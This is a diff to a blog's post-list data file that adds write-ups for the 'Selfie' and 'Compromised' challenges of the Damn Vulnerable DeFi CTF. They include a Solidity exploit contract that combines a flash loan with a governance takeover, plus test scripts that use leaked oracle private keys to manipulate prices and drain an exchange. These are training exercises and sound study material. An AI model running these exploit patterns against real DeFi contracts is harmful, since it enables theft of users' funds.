@@ -3,7 +3,7 @@ export default {
         {
             id: "damn-vulnerable-defi-solutions-1-unstoppable",
             title: `Damn Vulnerable DeFi V3 Solutions: Unstoppable`,
-            description: `Solution for the 1st Damn Vulnerable DeFi v3 challenge.`,
+            description: `My solution to 1st Damn Vulnerable DeFi v3 challenge.`,
             date: "May 30, 2023",
             snippets: [
                 `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`,
@@ -15,7 +15,7 @@ export default {
         {
             id: "damn-vulnerable-defi-solutions-2-naive-receiver",
             title: `Damn Vulnerable DeFi V3 Solutions: Naive Receiver`,
-            description: `Solution for the 2nd Damn Vulnerable DeFi v3 challenge.`,
+            description: `My solution to 2nd Damn Vulnerable DeFi v3 challenge.`,
             date: "June 1, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
@@ -56,7 +56,7 @@ contract Exploit_NaiveReceiver {
         {
             id: "damn-vulnerable-defi-solutions-3-truster",
             title: `Damn Vulnerable DeFi V3 Solutions: Truster`,
-            description: `Solution for the 3rd Damn Vulnerable DeFi v3 challenge.`,
+            description: `My solution to 3rd Damn Vulnerable DeFi v3 challenge.`,
             date: "June 2, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
@@ -102,7 +102,7 @@ contract Exploit_Truster {
         {
             id: "damn-vulnerable-defi-solutions-4-side-entrance",
             title: `Damn Vulnerable DeFi V3 Solutions: Side Entrance`,
-            description: `Solution for the 4th Damn Vulnerable DeFi v3 challenge.`,
+            description: `My solution to 4th Damn Vulnerable DeFi v3 challenge.`,
             date: "June 3, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
@@ -153,7 +153,7 @@ contract Exploit_SideEntrance {
         {
             id: "damn-vulnerable-defi-solutions-5-the-rewarder",
             title: `Damn Vulnerable DeFi V3 Solutions: The Rewarder`,
-            description: `Solution for the 5th Damn Vulnerable DeFi V3 challenge.`,
+            description: `My solution to 5th Damn Vulnerable DeFi V3 challenge.`,
             date: "June 5, 2023",
             snippets: [
                 `// SPDX-License-Identifier: MIT
@@ -224,6 +224,111 @@ contract Exploit_TheRewarder {
     );
 
     await attacker.exploit();
+});`,
+            ],
+        },
+        {
+            id: "damn-vulnerable-defi-solutions-6-selfie",
+            title: `Damn Vulnerable DeFi V3 Solutions: Selfie`,
+            description: `My solution to 6th Damn Vulnerable DeFi V3 challenge.`,
+            date: "June 6, 2023",
+            snippets: [
+                `// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import "../DamnValuableTokenSnapshot.sol";
+import "./SimpleGovernance.sol";
+import "./SelfiePool.sol";
+
+contract Exploit_Selfie is IERC3156FlashBorrower {
+    address attackerEOA;
+    DamnValuableTokenSnapshot token;
+    SelfiePool pool;
+    SimpleGovernance governance;
+
+    constructor(
+        DamnValuableTokenSnapshot _token,
+        SelfiePool _pool,
+        SimpleGovernance _governance
+    ) {
+        attackerEOA = msg.sender;
+        token = _token;
+        pool = _pool;
+        governance = _governance;
+    }
+
+    function exploit() external {
+        uint256 poolBalance = token.balanceOf(address(pool));
+        pool.flashLoan(this, address(token), poolBalance, "x0");
+    }
+
+    function onFlashLoan(
+        address,
+        address,
+        uint256 amount,
+        uint256,
+        bytes memory
+    ) external returns (bytes32) {
+        //take a snapshot because it is checked in '_hasEnoughVotes(address)'
+        token.snapshot();
+        //contruct a malicious tx payload
+        bytes memory payload = abi.encodeWithSignature("emergencyExit(address)",attackerEOA);
+        governance.queueAction(address(pool), 0, payload);
+        //approve flash loan pool so it can pull back up the amount
+        token.approve(address(pool), amount);
+        //return CALLBACK_SUCCESS
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+}`,
+                `it("Exploit", async function () {
+    attacker = await (
+        await ethers.getContractFactory("Exploit_Selfie", player)
+    ).deploy(token.address, pool.address, governance.address);
+
+    await attacker.exploit();
+
+    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+    await governance.executeAction(1); //the proposal ID is 1
+});`,
+            ],
+        },
+        ,
+        {
+            id: "damn-vulnerable-defi-solutions-7-compromised",
+            title: `Damn Vulnerable DeFi V3 Solutions: Compromised`,
+            description: `My solution to 7th Damn Vulnerable DeFi V3 challenge.`,
+            date: "June 7, 2023",
+            snippets: [
+                `//HTTP/2 200 OK
+//content-type: text/html
+//content-language: en
+//vary: Accept-Encoding
+//server: cloudflare
+
+//4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
+//4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34`,
+                `it("Exploit", async function () {
+    const signer1 = new ethers.Wallet(
+        "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
+        ethers.provider
+    );
+    const signer2 = new ethers.Wallet(
+        "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
+        ethers.provider
+    );
+
+    await oracle.connect(signer1).postPrice("DVNFT", 0);
+    await oracle.connect(signer2).postPrice("DVNFT", 0);
+
+    await exchange.connect(player).buyOne({value: ethers.utils.parseEther("0.01")});
+
+    await oracle.connect(signer1).postPrice("DVNFT", ethers.utils.parseEther("999"));
+    await oracle.connect(signer2).postPrice("DVNFT", ethers.utils.parseEther("999"));
+
+    await nftToken.connect(player).approve(exchange.address, 0);
+    await exchange.connect(player).sellOne(0);
 });`,
             ],
         },
